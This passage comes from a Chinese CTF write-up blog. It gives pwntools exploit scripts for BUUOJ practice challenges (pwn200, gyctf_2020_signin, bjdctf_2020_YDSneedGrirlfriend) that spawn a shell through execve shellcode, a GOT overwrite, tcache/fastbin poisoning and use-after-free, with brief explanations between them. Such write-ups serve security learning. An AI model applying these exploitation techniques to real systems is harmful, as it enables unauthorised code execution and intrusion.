class=\"token string\">'b puts'</span><span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>sc <span class=\"token operator\">=</span> <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>xor rsi, rsi</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>push rsi</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>mov rdx, 0x68732f2f6e69622f</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>push rdx</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>xor rax, rax</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>mov al, 0x3b</pre></td></tr><tr><td data-num=\"26\"></td><td><pre>mov rdi, rsp</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>xor rdx, rdx</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>syscall</pre></td></tr><tr><td data-num=\"29\"></td><td><pre>'''</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>sc<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">48</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token keyword\">not</span> <span class=\"token string\">b'\\0'</span> <span class=\"token keyword\">in</span> payload</pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'u?\\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>s1 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'~~?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'1\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>s2 <span class=\"token operator\">=</span> s1 <span class=\"token operator\">-</span> <span class=\"token number\">0x50</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'money~\\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>以下是生成的 shellcode：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'pwn200'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26425</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b puts'</span><span class=\"token punctuation\">)</span>    </pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>payload <span class=\"token operator\">=</span> asm<span class=\"token punctuation\">(</span>shellcraft<span class=\"token punctuation\">.</span>sh<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span> <span class=\"token operator\">&lt;=</span> <span class=\"token number\">48</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">assert</span> <span class=\"token keyword\">not</span> <span class=\"token string\">b'\\0'</span> <span class=\"token keyword\">in</span> payload</pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">48</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'u?\\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>s1 <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b','</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'~~?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'1\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>s2 <span class=\"token operator\">=</span> s1 <span class=\"token operator\">-</span> <span class=\"token number\">0x50</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>free_g <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>payload <span class=\"token operator\">=</span> p64<span class=\"token punctuation\">(</span>s2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>payload <span class=\"token operator\">=</span> payload<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>free_g<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'money~\\n'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice : '</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231121171651525.png\" alt=\"image-20231121171651525\"></p>\n<h1 id=\"gyctf_2020_signin\"><a class=\"markdownIt-Anchor\" href=\"#gyctf_2020_signin\">#</a> *gyctf_2020_signin</h1>\n<p>经典堆题。</p>\n<p>释放函数只会释放 flag 为 1 的，同时释放后 flag 置 0，但不清空地址。编辑函数不检验 flag，因此可以构造 tcache dup，实现任意地址读写。</p>\n<p>编辑函数有使用次数限制，cnt 的默认值为 0，因此编辑函数只能使用一次。</p>\n<p><img data-src=\"./image-20231121192939127.png\" alt=\"image-20231121192939127\"></p>\n<p><strong>重点！</strong> <code>calloc</code>  函数不会从 tcache 中获取 chunk，而会从 fastbin 中直接获取。执行后若 tcache bin 中 chunk 个数未满 7，则会将 fastbin 中的 chunk 直接添加到 tcache bin 链<strong>开头</strong>。<strong>不会验证 chunk 合法性</strong>。</p>\n<h2 id=\"思路-2\"><a class=\"markdownIt-Anchor\" href=\"#思路-2\">#</a> 思路</h2>\n<p>先将 tcache bin 填满，然后释放一个 chunk 到 fastbin 中，修改其内容为 <code>ptr-0x10</code> 。之后分配掉几个 tcache bin 的块。</p>\n<p>此时进入后门函数调用 calloc ()，那么会分配到 fastbin 中的 chunk，然后将 ptr-0x10 处的 chunk 添加到 tcache bin 头部，将其 fd 修改为旧的 tcache bin 头部。因此 <code>ptr-0x10+0x10</code>  的值便不为 0，可以通过后门函数的验证。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'gyctf_2020_signin'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29224</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *0x4015CD'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice?'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'idx?\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0xf</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>ptr <span class=\"token operator\">=</span> <span class=\"token number\">0x4040C0</span> </pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    mal<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    free<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">7</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"bjdctf_2020_ydsneedgrirlfriend\"><a class=\"markdownIt-Anchor\" href=\"#bjdctf_2020_ydsneedgrirlfriend\">#</a> bjdctf_2020_YDSneedGrirlfriend</h1>\n<p>** 考点：**uaf, heap</p>\n<p>保护：没有 pie 和 got 保护。</p>\n<p><img data-src=\"./image-20231121201533808.png\" alt=\"image-20231121201533808\"></p>\n<p>经典 note 块管理 content 块的题。将 note 块的前 8 字节修改为后门函数即可。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'bjdctf_2020_YDSneedGrirlfriend'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28657</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice :'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    choose<span class=\"token 